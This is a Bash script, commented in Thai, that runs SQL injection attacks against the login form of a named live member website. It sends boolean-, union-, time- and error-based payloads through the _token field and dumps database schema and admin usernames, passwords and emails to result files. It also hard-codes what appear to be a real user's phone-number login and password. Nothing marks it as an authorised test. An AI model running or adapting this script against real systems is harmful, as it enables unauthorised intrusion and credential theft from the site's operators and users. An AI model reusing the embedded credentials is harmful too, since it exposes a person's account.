#!/bin/bash

echo "🎯 REAL ADMIN DATABASE EXTRACTION"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# 1. ทดสอบ SQL Injection ใน Login Form (POST)
echo "🚨 เทคนิค 1: SQL Injection ใน Login Form (POST)..."
echo "🚨 เทคนิค 1: SQL Injection ใน Login Form (POST)..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"

# Boolean-based SQL Injection ใน _token parameter
LOGIN_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=1--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=2--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM admins) > 0--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0--"
)

for i in "${!LOGIN_PAYLOADS[@]}"; do
    payload="${LOGIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Login Payload $((i+1))..."
    echo "  📊 ทดสอบ Login Payload $((i+1))..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"error"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "admin\|password\|error\|sql" | head -10 >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "admin\|password\|error\|sql" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    fi
    sleep 3
done

echo "" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo ""

# 2. Union-based SQL Injection ใน Login Form
echo "🚨 เทคนิค 2: Union-based SQL Injection ใน Login Form..."
echo "🚨 เทคนิค 2: Union-based SQL Injection ใน Login Form..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"

UNION_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM admins--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!UNION_PAYLOADS[@]}"; do
    payload="${UNION_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Union Payload $((i+1))..."
    echo "  📊 ทดสอบ Union Payload $((i+1))..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    fi
    sleep 3
done

echo "" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo ""

# 3. Database Schema Extraction
echo "🗄️ เทคนิค 3: Database Schema Extraction..."
echo "🗄️ เทคนิค 3: Database Schema Extraction..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"

SCHEMA_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database()--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='admins'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,null FROM information_schema.columns WHERE table_schema=database()--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Schema Payload $((i+1))..."
    echo "  📊 ทดสอบ Schema Payload $((i+1))..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
        
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    🔍 Schema ที่พบ:"
            echo "    🔍 Schema ที่พบ:" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10 >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    fi
    sleep 3
done

echo "" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo ""

# 4. Time-based SQL Injection
echo "⏰ เทคนิค 4: Time-based SQL Injection..."
echo "⏰ เทคนิค 4: Time-based SQL Injection..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"

TIME_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND SLEEP(5)--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM admins) > 0 AND SLEEP(5)--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND SLEEP(5)--"
)

for i in "${!TIME_PAYLOADS[@]}"; do
    payload="${TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Time Payload $((i+1))..."
    echo "  📊 ทดสอบ Time Payload $((i+1))..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    
    start_time=$(date +%s)
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response time: ${duration}s)"
        echo "    ✅ สำเร็จ (Response time: ${duration}s)" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
        
        if [[ $duration -gt 4 ]]; then
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)"
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    fi
    sleep 3
done

echo "" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo ""

# 5. Error-based SQL Injection
echo "🚨 เทคนิค 5: Error-based SQL Injection..."
echo "🚨 เทคนิค 5: Error-based SQL Injection..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"

ERROR_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(id,0x3a,username,0x3a,password,FLOOR(RAND(0)*2))x FROM admins GROUP BY x)x--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e))--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Error Payload $((i+1))..."
    echo "  📊 ทดสอบ Error Payload $((i+1))..." >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
        
        if [[ "$response" == *"error"* ]] || [[ "$response" == *"SQL"* ]] || [[ "$response" == *"admin"* ]]; then
            echo "    🔍 Error ที่พบ:"
            echo "    🔍 Error ที่พบ:" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "error\|sql\|admin\|password" | head -10 >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
            echo "$response" | grep -i "error\|sql\|admin\|password" | head -10
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
    fi
    sleep 3
done

echo "" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo ""

# 6. สรุปผลลัพธ์
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:"
echo "  🔓 Boolean-based SQL Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 Union-based SQL Injection: ✅ ดำเนินการแล้ว"
echo "  🗄️ Database Schema Extraction: ✅ ดำเนินการแล้ว"
echo "  ⏰ Time-based SQL Injection: ✅ ดำเนินการแล้ว"
echo "  🚨 Error-based SQL Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ real_admin_results_*.txt"
echo "📄 ตรวจสอบไฟล์ real_admin_results_*.txt เพื่อดูข้อมูล admin ที่ดึงได้"

echo "==================================================" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "  🔓 Boolean-based SQL Injection: ✅ ดำเนินการแล้ว" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "  🔓 Union-based SQL Injection: ✅ ดำเนินการแล้ว" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "  🗄️ Database Schema Extraction: ✅ ดำเนินการแล้ว" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "  ⏰ Time-based SQL Injection: ✅ ดำเนินการแล้ว" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "  🚨 Error-based SQL Injection: ✅ ดำเนินการแล้ว" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ real_admin_results_*.txt" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"
echo "📄 ตรวจสอบไฟล์ real_admin_results_*.txt เพื่อดูข้อมูล admin ที่ดึงได้" >> "real_admin_results_$(date +%Y%m%d_%H%M%S).txt"

echo ""
echo "🎯 การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ real_admin_results_*.txt"